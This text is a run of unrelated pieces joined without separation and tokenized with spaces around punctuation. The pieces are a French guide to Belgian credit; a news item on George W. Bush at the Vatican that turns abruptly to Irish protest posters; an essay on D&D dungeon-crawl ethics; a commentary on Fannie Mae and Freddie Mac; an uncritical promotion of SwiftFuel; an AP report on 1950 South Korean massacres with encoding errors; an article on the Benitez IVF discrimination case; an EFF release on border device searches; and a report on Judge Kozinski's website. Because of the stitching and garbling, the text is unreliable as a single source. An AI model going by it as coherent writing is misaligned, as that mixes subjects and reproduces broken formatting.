Si c’est la première fois que tu demandes un crédit en Belgique , j’imagine déjà à quel point tu dois être stressé avec une tonne de questions laissées sans réponse : quel crédit faut - il contracter ?
À qui s’adresser ?
Quelles sont les conditions ?
Eh bien , tu es au bon endroit !
Avec mon aide , tu y verras plus clair en deux temps trois mouvements .
Quel crédit pour mon projet ?
Quel que soit ton projet , sache que tu trouveras forcément chaussure à ton pied .
En effet , les banques belges sont nombreuses et chacune propose des offres variées pour répondre aux besoins des clients .
Mais en général , il existe 4 types de crédit que je vais immédiatement te faire découvrir .
J’achète ma maison
Tu as trouvé la maison de tes rêves ou un magnifique terrain sur lequel tu pourrais bâtir une villa ?
Si tu as besoin d’un coup de pouce financier , tu peux compter sur les diverses formules de prêt hypothécaire .
Cependant , avant d’accorder ce crédit , les banques exigent souvent un apport ou une garantie ( hypothèque ) , donc il faudra s’y préparer à l’avance .
J’ai un projet à financer
Pour tes divers projets , il existe les crédits à la consommation .
Tu as le choix entre le prêt personnel et les crédits affectés : prêt travaux , crédit auto , prêt étudiant , prêt moto …
Si tu ne souhaites pas justifier l’utilisation du crédit , il est préférable d’opter pour le prêt personnel .
En plus , ce crédit est plus facile à obtenir , surtout en cas de besoin urgent d’argent .
Et pour une réserve d’argent ?
Le prêt renouvelable qui est associé à ta carte de crédit te permet de profiter d’une certaine somme mensuellement .
Tu peux la dépenser entièrement ou partiellement et le plus intéressant c’est que tu ne rembourseras que le montant utilisé .
Et à la fin de chaque remboursement , la réserve d’argent se reconstitue et tu pourras l’utiliser à nouveau .
Fais - moi gagner du temps !
Lorsqu’on a plusieurs crédits à rembourser et qu’on ne souhaite pas sombrer dans le surendettement , la meilleure chose à faire est d’effectuer une demande de rachat de crédit .
Le principe du regroupement de crédit est simple : tu demandes à une banque de racheter tes prêts en cours afin de bénéficier de conditions de remboursement plus avantageuses comme la réduction du montant des mensualités et le rallongement de la durée de remboursement .
US President George W Bush has met Pope Benedict at the Vatican on the latest leg of his European visit .
Mr Bush described the meeting as an honour .
The White House said a range of issues was discussed , including AIDS , Africa and combating poverty .
Mr Bush will also travel to Paris , London and Belfast .
The Irish Anti-War Movement has meanwhile said it will defy a Dublin City Council decision to refuse it permission to erect posters advertising a protest against the visit in Belfast .
The anti-war organisation has described the poster ban as a blatant act of political censorship , and accused officials of pursuing an agenda to suppress any political activity that questions US foreign policy .
The group says the council replied with an email stating that it was refusing permission for the posters to be erected , as the council felt that it may be perceived as offensive by members of the public .
In Stormont today a member of the Assembly said Mr Bush 's visit was not reason enough to cancel business on Monday .
The decision to scrap the scheduled sitting at Parliament Buildings to accommodate the arrival of the US president was attacked by Alliance chief Whip Kieran McCarthy .
The Strangford MLA said too much time had already been wasted at Stormont since devolution and the presence of a VIP guest did not justify the suspension .
He noted that the Mr Bush would not even be in Parliament Buildings , as his tour only took place in nearby Stormont castle .

Two things I ’ve read recently have gotten me thinking about the ethics within a game system again — a subject I ’ve thought about many times before , but until now a subject I ’ve never really considered in much depth while I was writing a lot of essays about roleplaying for a Weblog .
One of those things was the Motivation system in E8 , in some respects a replacement for D&D ’s alignment system .
Roleplaying games tend to impose ethical systems on their characters that are not strictly in line with the ethics of the players .
Sometimes , that ends up being a subtle shift , and at other times it can be quite dramatic .
This is not terribly surprising : often , the rules and metaphysical foundations of these gameworlds significantly alter the way one must think about the world .
What still surprises me , after all these years of gaming , is that quite often the most dramatic shifts in ethical systems from those one holds in the real world can go not only unremarked , but essentially unnoticed .
Dungeons and Dragons games are the first , and in many ways the worst , offenders in this respect .
Let ’s take an example of how the skewed ethics of a typical D&D gameworld , in pursuit of the goals of a typical D&D adventure module , plays out :
You arrive at the mouth of a cave .
After a few minutes of preparing yourselves — making sure your armor is securely fastened , lighting a torch , readying your weapons — you head into the gaping maw of subterranean darkness , eager to meet the challenges that await .
Within the system of tunnels to which that cave entrace led , you discovered a kobold warren and vanquished the diminutive monsters , slaying them all and collecting some treasure for your troubles .
You were victorious , and you will all be remembered as heroes in the surrounding human villages .
That sounds about normal .
It ’s probably a dungeon crawl for four to six second level characters , and might actually have been drawn from a module you bought at your local game store .
Okay , let ’s try describing it slightly differently , without changing any of the actual circumstances :
You arrive at the mouth of a cave .
After a few minutes of preparing yourselves — making sure your armor is securely fastened , lighting a torch , readying your weapons — you head into the gaping maw of subterranean darkness , eager to meet the challenges that await .
Within the system of tunnels to which that cave entrace led , you by chance discovered a kobold warren and vanquished the diminutive humanoids , slaying the entire tribe and looting their corpses and nests for your troubles .
You were victorious , having caught the entire community — which had no idea what trouble approached — by surprise .
I wonder if you ’ve caught on yet .
We can try again , in case any readers are so used to the typical dungeon crawl adventure that the ethical absurdity of this situation has n’t dawned on them yet :
You arrive at the mouth of a cave .
After a few minutes of preparing yourselves — making sure your armor is securely fastened , lighting a torch , readying your weapons , taking stock of how much healing capability your cleric and paladin currently have available — you head into the gaping maw of subterranean darkness , eager to slaughter the creatures that await for glory and riches .
Within the system of tunnels to which that cave entrace led , you by chance discovered a kobold warren and killed all of the diminutive humanoids , slaying the entire tribe to the last unhatched egg and the female who protected it , and looting their corpses and homes for your troubles .
You were victorious , having caught the entire community — which had no idea what trouble approached — by surprise when you stealthily invaded the caves and descended upon them while the majority of them slept .
I read something recently that posed the question : “ Will I lose my Paladin powers if I kill the kobold babies ? ”
Clearly , there are some players who think about these things , but most of the time the GM carefully arranges circumstances so that you do n’t have to , and can just view the intelligent foes you face as treasure drops in the ’ 80s video game , Gauntlet , with zero moral implications to your actions and only reputation , gold , and experience points at stake .
Does your GM ever mention the noncombatants in the dungeon , or is it miraculously populated only by males bristling with ( primitive ) weapons and bearing hateful sneers on their inhuman snouts ?
How do they reproduce , anyway , if they do n’t just “ spawn ” in a given location as if you were playing Everquest ?
Let ’s add some detail somewhere in the middle of the scenario :
Having carefully made your way deep into the tunnel system beneath the hills , you approach a source of firelight ahead .
The tunnels , you see , eventually open into a huge cavern , with a few scattered campfires .
The smoke of the fires escapes through cracks in the cavern ’s ceiling , and there are neighborhoods of sorts gathered around each , with dividing partitions creating semi-private living areas made out of hides suspended from primitive wooden frames .
Dozens of kobolds lie sleeping within these partitioned areas , perhaps separated along the lines of family units , in some cases including obviously very young kobold children , in some cases an egg or two .
The paladin uses his Detect Evil ability , and discovers that all the adults appear to be evil .
You heft your weapons in your hands , call spells to mind , ready to rid the world of the scourge of these evil creatures .
Okay , so . . . what about the children ?
It seems they are n’t evil , which makes sense — they ’re just children , after all .
How likely are they to survive after their parents are all slain ?
Wo n’t some of them , as an act that would be considered good anywhere else , throw themselves into the fray to attempt to defend their parents from these invaders ?
Perhaps you can set up an ambush outside , then have one character who is fleet of foot draw their attention to lure them outside — thus leaving the children out of the fighting .
Of course , that does n’t solve the problem of how you avoid leaving a bunch of defenseless children to die .
Surely you do n’t want to adopt a bunch of kobold youths and raise them as your own , teaching them how to be Good — and surely they would n’t stand for that anyway , after you ’ve killed every adult they ’ve ever known .
Let ’s just adjust that last bit , to deal with this little problem :
The paladin uses his Detect Evil ability , and discovers that all the kobolds — male , female , old young , all of them — are evil .
You heft your weapons in your hands , call spells to mind , ready to rid the world of the scourge of these evil creatures .
Okay , that makes everything better — but wait !
The children are evil ?
What makes them evil , exactly ?
Are they evil even if they ’ve never done anything to harm another , and in fact never intended to do so ?
Maybe they ’re evil because they have sadistic tendencies — because they really desire to cause others pain and do unpleasant things to them .
Maybe murder , rape , and theft are in their blood ( and we ’ll just ignore the similarity of murder and theft to what the PCs are doing in this dungeon ) .
Is a kobold still evil if he realizes indulging those desires is bad , and resists them ?
Is someone with pedophiliac urges evil if he , through force of will , resists those urges and passes away in his deathbed at the ripe old age of 83 having never indulged such urges throughout his life ?
I mentioned two things I read in the last few days that got me thinking about the ethics within a gameworld again .
The other is the Violence RPG , available for download as a free PDF from its designer ’s Website .
The whole thing is a satire on the way dungeon crawl games are conducted , casting the dungeon crawl slay - and - loot ethos in the modern , “ real ” world .
In the real world , of course , there are no kobolds , so you kill people from poor neighborhoods instead , and take their “ loot ” , since — unlike the rich — they ’re not very well defended .
If the game ’s too long for you to read , maybe you should check out the reviews on rpg.net instead .
Really , though , the Violence game itself is worth the read , from what I ’ve read of it so far .
I particularly like the section on Orcs ( no , it does n’t say there are orcs in the game — it just talks about the place orcs have in games in general , since Violence is more of an essay on the state of the gaming hobby than a real , serious game ) .
In that section , the author devolves into a discussion of an injection of dharma and buddhism into the realm of Quake .
It ’s brilliant .
It also points out some of the problems I ’ve had with the stereotypical dungeon crawl D&D adventure for more than two decades now .
My question is :
Why does n’t everyone have these issues with dungeon crawl adventures , and the ethical skew of the typical gameworld as a whole ?
Dungeon crawl adventure modules fly off the shelves , offering exactly the sort of murder - and - loot approach to the game as Violence offers , but nobody seems the least bit disturbed — at least until they read Violence itself .
I , for one , have never had a paladin character wipe out an entire kobold tribe .
Have you ?

When do the words “ not guaranteed ” actually mean “ guaranteed ” ?
Whenever the mortgage giants Fannie Mae and Freddie Mac are involved .
The two companies have long been required to tell investors that their securities are not guaranteed by the federal government .
But in the financial markets everyone has always assumed that this demurral was just window - dressing , and everyone , it turns out , was right .
Last week , when fears of a possible collapse of the two companies threatened to spark a major financial crisis , the Treasury Department and the Federal Reserve quickly came up with a rescue package .
What had been an implicit guarantee became an explicit one .
Fannie and Freddie are the duck - billed platypuses of the financial world .
They ’re profit - driven corporations , owned by shareholders and , in theory , beholden only to them .
But they ’re also so - called “ government - sponsored enterprises , ” set up by the state with the explicit mission of fostering homeownership , by buying and selling home mortgages .
Unlike ordinary corporations , they ’re exempt from most state and local taxes and certain S.E.C. requirements , and they have access to a government credit line .
Other G.S.E.s play similar roles in other markets : the Federal Home Loan Banks make loans to banks , credit unions , and thrifts ; the Farm Credit Banks facilitate the flow of credit to farmers ; and Farmer Mac buys up farm and rural - housing mortgages .
In each case , the government saw a hole in the marketplace and chartered a company to fill it .
The G.S.E.s are curious , because there ’s no obvious reason for them to exist in the form they do : instead of creating private companies to do all these jobs , the government could just do them itself .
In fact , that ’s how Fannie Mae got started , back in 1938 : originally , it was a government agency endowed with the authority to buy mortgages , in the hope that this would expand the supply of credit to homeowners .
It was n’t until 1968 that Fannie was privatized .
( Freddie Mac was created two years later , and was private from the start . )
The main reason for the change was surprisingly mundane : accounting .
At the time , Lyndon Johnson was concerned about the effect of the Vietnam War on the federal budget .
Making Fannie
Mae private moved its liabilities off the government ’s books , even if , as the recent crisis made clear , the U.S. was still responsible for those debts .
It was a bit like what Enron did thirty years later , when it used “ special - purpose entities ” to move liabilities off its balance sheet .
Making Fannie and Freddie into these weird hybrids may have spruced up the budget , but in the long run it also made it easy for the companies to grow too big , too fast .
Because everyone assumed that the government would make good on Fannie ’s and Freddie ’s debts , they could borrow money more cheaply than their competitors .
They used this cheap debt to increase the number of mortgages they bought .
Had Fannie and Freddie been ordinary private companies , there would have been a natural check : companies with more debt are usually seen as riskier , and that makes shareholders and bondholders less willing to invest in them .
Or , had Fannie and Freddie been government agencies , budget constraints would likely have limited the scope of their lending .
Since neither the market nor the state checked their growth , they were able to swell extravagantly .
( Regulators might have reined the companies in , but , thanks in part to ardent lobbying by Fannie and Freddie , Congress failed to provide them with sufficient power to do so . )
The result of all this was that the companies reaped the rewards of the private sector while enjoying the security of the public sector .
Seemingly insulated from all harm , they became reckless .
They constructed a giant pyramid of debt on a very small base of capital ( eighty - one billion dollars , by the most recent publicly available figures ) , and by May , 2008 , either owned or guaranteed more than five trillion dollars in mortgages .
As a result , even though just a small percentage of Fannie ’s and Freddie ’s mortgages are delinquent , the potential losses are huge .
That ’s why , in recent weeks , investors finally lost faith in them .
Whatever their sins , Fannie and Freddie clearly could n’t be allowed to fail , but that ’s no argument for letting them go on as they are .
Either they should be forced to make it as private companies or they should be nationalized .
Given that their business depends on the promise of government assistance and that their current state remains woeful ( despite an upturn in their fortunes late last week ) , nationalization seems more sensible .
If Fannie and Freddie are going to run up a tab and stick taxpayers with the bill , why should shareholders profit ?
Beyond that question , though , is a more important one : Do we need Fannie and Freddie at all ?
Their supposed reason for being is that their ability to borrow money at low rates lowers borrowing costs for homeowners .
But a paper by the economist Wayne Passmore , of the Federal Reserve , suggests that in fact Fannie and Freddie have only a small effect on the interest rates that homeowners pay , saving them less than one - tenth of a percentage point .
More important , if the last few years have taught us anything , it ’s that homeownership is not an unalloyed economic good , and that we should be cautious about using gimmicks to make it more attractive .
The government already offers homeowners a subsidy , in the form of a mortgage tax break .
Given everything else we could be spending taxpayer money on , does the government really need to be in the mortgage - buying business , too ? ♦

Now here ’s an interesting solution to the problem of reducing emissions using the same fleet of cars we have , but by using different fuel .
Airplanes need high octane fuel and the octane rating has until now been achieved by adding tetraethyl lead , but that will be outlawed from 2010 .
Ethanol achieves the same octane rating boost but is unsuitable for use in aircraft .
To solve the riddle , the newly announced SwiftFuel© uses ethanol to produce a designer fuel with a 104 octane rating that has no ethanol in it .
It runs fine in any existing plane ( or car ) , and is a low emission , alternative made entirely from biomass that has 15 - 20 % more energy per litre than petrol , so your plane ( or car ) will get better mpg too .
And it costs half as much to make as current petroleum manufacturing cost , selling for $ 2 a gallon less than gasoline .
What ’s the catch ?
No , we ca n’t see a catch .
Swift Enterprises ’ new general aviation SwiftFuel© is less expensive , more fuel - efficient and significantly environmentally friendlier .
Unlike current biomass fuels , SwiftFuel© is comprised of synthetic hydrocarbons derived from biomass yet meets or exceeds the standards for aviation fuel as verified by nationally recognized laboratories .
John Rusek , a professor in Purdue University 's School of Astronautics and Aeronautics Engineering , and his wife Mary founded Swift Enterprises seven years ago at Purdue Research Park , Both John and Mary worked at Edwards Air Force Base in the mid80s , where they conducted research on rockets and rocket fuel for the government .
Swift aims to use renewable resources to end the energy crisis .
It works with hydrogen peroxide and other novel chemicals as new components in fuel cells and propellants .
The scientists at Swift bring a combination of military , academic and private enterprise experience to the fundamental research and development of propulsion , ordnance and power technologies , and hardware .
" Our fuel should not be confused with first - generation bio - fuels like E - 85 , which do n't compete well right now with petroleum , ” Rusek said .
" For general aviation aircraft , range is paramount .
Not only can our fuel seamlessly replace the aviation industry 's standard petroleum fuel , it can outperform it . "
The general aviation industry each year uses nearly 570 million gallons of 100LL aviation fuel , which is toxic , increasingly expensive and non-renewable .
In contrast , testing has shown SwiftFuel© is 15 percent to 20 percent more fuel efficient , has no sulfur emissions , requires no stabilizers ; has a 30 - degree lower freezing point , introduces no new carbon emissions , and is lead - free .
In addition , the components of this fuel can be formulated into a replacement for jet / turbine fuels .
" The general aviation industry , both domestic and foreign , is demanding a solution to this dilemma , " said Mary Rusek , Swift Enterprises ' president .
" Our new , patented technology can provide the 1.8 million gallons per day required by the industry in the U.S. by utilizing only 5 percent of this country 's existing bio - fuel plant infrastructure . "
Note : a wonderful article by Robert X. Cringely discussing SwiftFuel can be found here under the title , “ It 's the Platform , Stupid : Baby steps are the way to energy independence . ”
AP : U.S. Okayed Korean War Massacres Associated Press

The American colonel , troubled by what he was hearing , tried to stall at first .
But the declassified record shows he finally told his South Korean counterpart it " would be permitted " to machine - gun 3,500 political prisoners , to keep them from joining approaching enemy forces .
In the early days of the Korean War , other American officers observed , photographed and confidentially reported on such wholesale executions by their South Korean ally , a secretive slaughter believed to have killed 100,000 or more leftists and supposed sympathizers , usually without charge or trial , in a few weeks in mid-1950 .
Extensive archival research by The Associated Press has found no indication Far East commander Gen. Douglas MacArthur took action to stem the summary mass killing , knowledge of which reached top levels of the Pentagon and State Department in Washington , where it was classified " secret " and filed away .
Now , a half - century later , the South Korean government 's Truth and Reconciliation Commission is investigating what happened in that summer of terror , a political bloodbath largely hidden from history , unlike the communist invaders ' executions of southern rightists , which were widely publicized and denounced at the time .
In the now - declassified record at the U.S. National Archives and other repositories , the Korean investigators will find an ambivalent U.S. attitude in 1950 â at times hands - off , at times disapproving .
" The most important thing is that they did not stop the executions , " historian Jung Byung - joon , a member of the 2 - year - old commission , said of the Americans .
" They were at the crime scene , and took pictures and wrote reports . "
They took pictures in July 1950 at the slaughter of dozens of men at one huge killing field outside the central city of Daejeon .
Between 3,000 and 7,000 South Koreans are believed to have been shot there by their own military and police , and dumped into mass graves , said Kim Dong- choon , the commission member overseeing the investigation of these government killings .
The bones of Koh Chung - ryol 's father are there somewhere , and the 57 - year - old woman believes South Koreans alone are not to blame .
" Although we can't present concrete evidence , we bereaved families believe the United States has some responsibility for this , " she told the AP , as she visited one of the burial sites in the quiet Sannae valley .
Frank Winslow , a military adviser at Daejeon in those desperate days long ago , is one American who feels otherwise .
The Koreans were responsible for their own actions , said the retired Army lieutenant colonel , 81 .
" The Koreans were sovereign .
To me , there was never any question that the Koreans were in charge , " he said in a telephone interview from his home in Bellingham , Wash .
The brutal , hurried elimination of tens of thousands of their countrymen , subject of a May 19 AP report , was the climax to a years - long campaign by South Korea 's right - wing leaders .
In 1947 , two years after Washington and Moscow divided Korea into southern and northern halves , a U.S. military government declared the Korean Labor Party , the southern communists , to be illegal .
President Syngman
Rhee 's southern regime , gaining sovereignty in 1948 , suppressed all leftist political activity , put down a guerrilla uprising and held up to 30,000 political prisoners by the time communist North Korea invaded on June 25 , 1950 .
As war broke out , southern authorities also rounded up members of the 300,000 - strong National Guidance Alliance , a " re-education " body to which they had assigned leftist sympathizers , and whose membership quotas also were filled by illiterate peasants lured by promises of jobs and other benefits .
Commission investigators , extrapolating from initial evidence and surveys of family survivors , believe most alliance members were killed in the wave of executions .
On June 29 , 1950 , as the southern army and its U.S. advisers retreated southward , reports from Seoul said the conquering northerners had emptied the southern capital 's prisons , and ex-inmates were reinforcing the new occupation regime .
In a confidential narrative he later wrote for Army historians , Lt. Col. Rollins S. Emmerich , a senior U.S. adviser , described what then happened in the southern port city of Busan , formerly known as Pusan .
Emmerich was told by a subordinate that a South Korean regimental commander , determined to keep Busan 's political prisoners from joining the enemy , planned " to execute some 3500 suspected peace time Communists , locked up in the local prison , " according to the declassified 78 - page narrative , first uncovered by the newspaper Busan Ilbo at the U.S. National Archives .
Emmerich wrote that he summoned the Korean , Col. Kim Chong - won , and told him the enemy would not reach Busan in a few days as Kim feared , and that " atrocities could not be condoned . "
But the American then indicated conditional acceptance of the plan .
" Colonel Kim promised not to execute the prisoners until the situation became more critical , " wrote Emmerich , who died in 1986 .
" Colonel Kim was told that if the enemy did arrive to the outskirts of ( Busan ) he would be permitted to open the gates of the prison and shoot the prisoners with machine guns . "
This passage , omitted from the published Army history , is the first documentation unearthed showing advance sanction by the U.S. military for such killings .
" I think his ( Emmerich's ) word is so significant , " said Park Myung - lim , a South Korean historian of the war and adviser to the investigative commission .
As that summer wore on , and the invaders pressed their attack on the southern zone , Busan - area prisoners were shot by the hundreds , Korean and foreign witnesses later said .
Emmerich wrote that soon after his session with Kim , he met with South Korean officials in Daegu , 55 miles ( 88 kilometers ) north of Busan , and persuaded them " at that time " not to execute 4,500 prisoners immediately , as planned .
Within weeks , hundreds were being executed in the Daegu area .
The bloody anticommunist purge , begun immediately after the invasion , is believed by the fall of 1950 to have filled some 150 mass graves in secluded spots stretching to the peninsula 's southernmost counties .
Commissioner Kim said the commission 's estimate of 100,000 dead is " very conservative . "
The commission later this month will resume excavating massacre sites , after having recovered remains of more than 400 people at four sites last year .
The AP has extensively researched U.S. military and diplomatic archives from the Korean War in recent years , at times relying on once - secret documents it obtained through Freedom of Information Act requests and declassification reviews .
The declassified U.S. record and other sources offer further glimpses of the mass killings .
A North Korean newspaper said 1,000 prisoners were slain in Incheon , just west of Seoul , in late June 1950 â a report partly corroborated by a declassified U.S. Eighth Army document of July 1950 saying " 400 Communists " had been killed in Incheon .
The North Korean report claimed a U.S. military adviser had given the order .
As the front moved south , in July 's first days , Air Force intelligence officer Donald Nichols witnessed and photographed the shooting of an estimated 1,800 prisoners in Suwon , 20 miles south of Seoul , Nichols reported in a little - noted memoir in 1981 , a decade before his death .
Around the same time , farther south , the Daejeon killings began .
Winslow recalled he declined an invitation to what a senior officer called the " turkey shoot " outside the city , but other U.S. officers did attend , taking grisly photos of the human slaughter that would be kept classified for a half - century .
Journalist Alan Winnington , of the British communist Daily Worker newspaper , entered Daejeon with North Korean troops after July 20 and reported that the killings were carried out for three days in early July and two or three days in mid-July .
He wrote that his witnesses claimed jeeploads of American officers " supervised the butchery . "
Secret CIA and Army intelligence communications reported on the Daejeon and Suwon killings as early as July 3 , but said nothing about the U.S. presence or about any U.S. oversight .
In mid-August , MacArthur , in Tokyo , learned of the mass shooting of 200 to 300 people near Daegu , including women and a 12 - or 13 - year - old girl .
A top-secret Army report from Korea , uncovered by AP research , told of the " extreme cruelty " of the South Korean military policemen .
The bodies fell into a ravine , where hours later some " were still alive and moaning , " wrote a U.S. military policeman who happened on the scene .
Although MacArthur had command of South Korean forces from early in the war , he took no action on this report , other than to refer it to John J. Muccio , U.S. ambassador in South Korea .
Muccio later wrote that he urged South Korean officials to stage executions humanely and only after due process of law .
The AP found that during this same period , on Aug. 15 , Brig .
Gen. Francis W. Farrell , chief U.S. military adviser to the South Koreans , recommended the U.S. command investigate the executions .
There was no sign such an inquiry was conducted .
A month later , the Daejeon execution photos were sent to the Pentagon in Washington , with a U.S. colonel 's report that the South Koreans had killed " thousands " of political prisoners .
The declassified record shows an equivocal U.S. attitude continuing into the fall , when Seoul was retaken and South Korean forces began shooting residents who collaborated with the northern occupiers .
When Washington 's British allies protested , Dean Rusk , assistant secretary of state , told them U.S. commanders were doing " everything they can to curb such atrocities , " according to a Rusk memo of Oct. 28 , 1950 .
But on Dec. 19 , W.J. Sebald , State Department liaison to MacArthur , cabled Secretary of State Dean Acheson to say MacArthur 's command viewed the killings as a South Korean " internal matter " and had " refrained from taking any action . "
It was the British who took action , according to news reports at the time .
On Dec. 7 , in occupied North Korea , British officers saved 21 civilians lined up to be shot , by threatening to shoot the South Korean officer responsible .
Later that month , British troops seized " Execution Hill , " outside Seoul , to block further mass killings there .
To quiet the protests , the South Koreans barred journalists from execution sites and the State Department told diplomats to avoid commenting on atrocity reports .
Earlier , the U.S. Embassy in London had denounced as " fabrication " Winnington 's Daily Worker reporting on the Daejeon slaughter .
The Army eventually blamed all the thousands of Daejeon deaths on the North Koreans , who in fact had carried out executions of rightists there and elsewhere .
An American historian of the Korean War , the University of Chicago 's Bruce Cumings , sees a share of U.S. guilt in what happened in 1950 .
" After the fact â with thousands murdered â the U.S. not only did nothing , but covered up the Daejeon massacres , " he said .
Another Korean War scholar , Allan R. Millett , an emeritus Ohio State professor , is doubtful .
" I 'm not sure there 's enough evidence to pin culpability on these guys , " he said , referring to the advisers and other Americans .
The swiftness and nationwide nature of the 1950 roundups and mass killings point to orders from the top , President Rhee and his security chiefs , Korean historians say .
Those officials are long dead , and Korean documentary evidence is scarce .
To piece together a fuller story , investigators of the Truth and Reconciliation Commission will sift through tens of thousands of pages of declassified U.S. documents .
The commission 's mandate extends to at least 2010 , and its president , historian Ahn Byung - ook , expects to turn then to Washington for help in finding the truth .
" Our plan is that when we complete our investigation of cases involving the U.S. Army , we 'll make an overall recommendation , a request to the U.S. government to conduct an overall investigation , " he said .

A case before the California Supreme Court , brought by a woman refused in vitro fertilization by her doctors because she is a lesbian , serves as a reminder that medical discrimination is still a real threat for many Americans .
Imagine going to a doctor for
medical treatment and hearing that doctor say that she wo n’t treat
you because of who you are .
Not that she ca n’t treat you because
of your medical condition does n’t match up to her expertise , but that she wo n’t treat you because doing
so would violate her religious convictions .
It brings to mind some of
the most wretched moments in history , when nations adopted laws that
denied citizens equal treatment based on their race , religion , and cultural
background .
As comforting
as it may be to think that such events are a thing of the past , a case coming before
the California Supreme Court ,
brought by a woman refused in vitro fertilization ( IVF ) by her doctors because she is
a lesbian , serves as a reminder that medical discrimination is still
a real threat for many Americans .
Guadalupe Benitez of Oceanside ,
California , went to a local medical practice that was covered by her
insurance to receive treatment for polycystic ovarian
syndrome .
In 1999 , she was finally ready to attempt to get pregnant through artificial
insemination .
That ’s when her doctors , citing religious objection to aiding lesbian parenthood , refused to perform the procedure .
Benitez , now
36 and the mother of a 6 - year - old boy and 2 - year - old twin
girls , sued her doctors for discrimination based on sexual orientation .
Benitez alleges that her doctors
treated her with fertility drugs but refused to conduct the IVF procedure
saying that doing so for a lesbian patient went against their religious
beliefs .
She also alleges that her doctors gave her instruction
on how to inseminate herself but refused to handle the procedure themselves .
Benitez ’s doctors , Christine Brody and Douglas Fenton , refused to
perform the IVF procedure for her in 2000 .
In 2001 , Benitez she sued them ,
claiming that they " violated a California state law that bars for - profit
businesses from ‘ arbitrarily ’ discriminating against clients
based on characteristics such as race , age and sexual orientation , " the Daily Women ’s Health Policy Report notes .
Prior to 2000 , the California Supreme Court had ruled that businesses
could not deny services based on sexual orientation but it did not rule
against discrimination based on a person ’s marital status until 2005 .
In sworn declarations Benitez ’s
attorneys said that her doctors stated that they refused her IVF based
on their Christian beliefs , which they said prohibited them from providing
the treatment to lesbians .
However , in later depositions the doctors
claimed that their beliefs prohibited them from providing the treatment
to any unmarried couples regardless of their sexual orientation .
Although a trial court ruled in favor of Benitez , that ruling was over
turned by an appellate court , which noted that California civil rights
law at the time did allow businesses to deny services based on a person ’s
marital status .
Now the case , which has been brought to address the issue of whether a doctor ’s religious views can be used as a defense for refusing treatment , is before the California Supreme Court with a ruling expected in the next 90 days .

Until 2005 ,
women could be denied medical treatment for infertility in California
because they were not married on the grounds that assisting them in
getting pregnant was a sin .
History reminds us that many women
were refused prescriptions for the pill because they were not married .
If the California Supreme Court rules that doctors may refused lesbians
treatment based on their religious beliefs , would they also be allowed
to use that defense to refuse treatment to people of color , people of
a different faith or atheists ?
Those questions should not
be casually dismissed .
The refusal of services based on religious
grounds is a defense used by pharmacists who refuse to fill prescriptions
throughout America .
The National Women’s
Law Center reports
that refusals to fill contraception or emergency contraception prescriptions
by pharmacists are increasing nationwide .
These refusals are particularly
problematic in rural areas and for low - income patients who may not have
other pharmacy options .
The National Women ’s Law Center ’s Pharmacy Refusal
Project works to address the problem of pharmacy refusals by developing
legal approaches to secure the right to access contraception at the
pharmacy and providing technical assistance for people who have been denied
contraception .
It is important to note that there is a difference between the denial of IVF based on the patient ’s sexual orientation and the refusal to fill a prescription because of a religious objection to the purpose of the medication .
The denial of IVF based on a patient ’s sexual orientation is a case of discrimination against an individual while the refusal to fill a prescription is based on a personal objection to the medication itself and / or the service requested , not the individual requesting that service .
The Committee on Ethics of The American College of Obstetricians and Gynecologists ( ACOG ) addressed conscientious refusal in their November 2007 opinion titled The Limits of Conscientious Refusal in Reproductive Medicine .
The abstract of the opinion explains that
… conscientious refusals should be limited if they constitute an imposition of religious or moral beliefs on patients , negatively affect a patient ’s health , are based on scientific misinformation , or create or reinforce racial or socioeconomic inequities .
Conscientious refusals that conflict with patient well - being should be accommodated only if the primary duty to the patient can be fulfilled .
In the Benitez case , her doctors did not refuse to treat her after the initial consultation and then refer her to another physician .
They treated her as their patient for quite some time and then refused her the IVF procedure because of who she is , and that is a deviation from the guidelines stressed in the ACOG opinion and the basis for the discrimination lawsuit .

San Francisco - The Electronic Frontier Foundation ( EFF ) and a broad coalition , including civil rights groups , professional associations and technologists , called on Congress today to hold oversight hearings on the Department of Homeland Security 's search and seizure of electronic devices at American borders .
The press has widely reported disturbing stories about U.S. citizens subject to intrusive searches of their laptops and cell phones .
But a recent court decision found that customs officials can search travelers ' computers at the border without suspicion or cause .
In a letter sent to the House and Senate Homeland Security and Judiciary committees today , the coalition urges lawmakers to consider passing legislation to prevent abusive search practices by border agents and to protect all Americans from suspicionless digital border inspections .
" Our computers , cell phones , and other electronic devices hold a vast amount of personal information like financial data , health histories , and personal emails and letters , " said EFF Staff Attorney Marcia Hofmann .
" In a free country , the government cannot have unlimited power to read , seize , and store this information without any oversight . "
So far , the Department of Homeland Security has refused to release its policies and procedures for conducting these intrusive searches .
EFF and the Asian Law Caucus have filed suit against the Department of Homeland Security to obtain the information through the Freedom of Information Act .
" Your privacy could be at risk even if you do n't travel yourself .
Your financial institution , your insurer , and other enterprises hold extensive personal data about you and your family , " said EFF Senior Staff Attorney Lee Tien .
" If agents of those groups travel internationally , your information could be exposed to officials at the border or potentially copied and stored in government databases .
Americans should know how and why electronic data is seized and kept by the government , and who is able to access it at the border and in the years afterwards . "
In addition to EFF , the coalition signing today 's letter includes more than 40 organizations and individuals , including the Association for Corporate Travel Executives , the American Civil Liberties Union , the National Association of Criminal Defense Lawyers , the Rutherford Institute , and prominent technologists such as Bruce Schneier and Whitfield Diffie .

One of the highest - ranking federal judges in the United States , who is currently presiding over an obscenity trial in Los Angeles , has maintained a publicly accessible website featuring sexually explicit photos and videos .
Alex Kozinski , chief judge of the U.S. 9th Circuit Court of Appeals , acknowledged in an interview with The Times that he had posted the materials , which included a photo of naked women on all fours painted to look like cows and a video of a half - dressed man cavorting with a sexually aroused farm animal .
Some of the material was inappropriate , he conceded , although he defended other sexually explicit content as “ funny . ”
Kozinski , 57 , said that he thought the site was for his private storage and that he was not aware the images could be seen by the public , although he also said he had shared some material on the site with friends .
After the interview Tuesday evening , he blocked public access to the site .
Asked whether the contents of his site should force him to step aside from the pending obscenity trial , Kozinski declined to comment .
Opening statements in the trial are scheduled for this morning .
In the case , Ira Isaacs , a filmmaker based in Los Angeles , is accused of distributing criminally obscene sexual - fetish videos depicting bestiality and defecation .
Advertisement
Stephen Gillers , a New York University law professor who specializes in legal ethics , told The Times that Kozinski should recuse himself from the Isaacs case because “ the public can reasonably question his objectivity ” concerning the issues at hand .
Gillers , who has known Kozinski for years and called him “ a treasure of the federal judiciary , ” said he took the judge at his word that he did not know the site was publicly available .
But he said Kozinski was “ seriously negligent ” in allowing it to be discovered .
“ The phrase ‘ sober as a judge ’ resonates with the American public , ” Gillers said .
“ We do n’t want them to reveal their private selves publicly .
This is going to upset a lot of people . ”
